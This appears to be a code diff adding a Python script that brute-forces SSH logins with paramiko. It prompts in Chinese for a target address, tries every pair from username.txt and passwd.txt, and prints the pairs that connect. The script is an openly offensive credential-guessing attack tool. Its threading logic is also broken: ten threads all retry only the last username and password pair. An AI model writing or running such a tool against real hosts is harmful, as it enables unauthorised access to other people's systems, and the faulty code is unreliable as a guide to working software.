@@ -1,0 +1,27 @@
+import paramiko
+import threading
+
+ip = input("请输入你要爆破的地址")
+for username in open('username.txt'):
+    for password in open('passwd.txt'):
+        lianjie = paramiko.SSHClient()
+        lianjie.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        username1=username.replace('\n','')
+        password1=password.replace('\n','')
+        try:
+            def cky():
+                x = lianjie.connect(hostname=ip, username=username1, password=password1)#使用对应账号密码，ip连接
+                if x is None:
+                    print(username1+"--->"+password1+"----->"+"ok")
+                lianjie.close()
+        except :
+            pass
+
+
+
+if __name__ == '__main__':
+    for zs in range(10):
+        multithreading_name='multithreading'+str(zs)
+        multithreading_name=threading.Thread(target=cky)
+        multithreading_name.start()
+
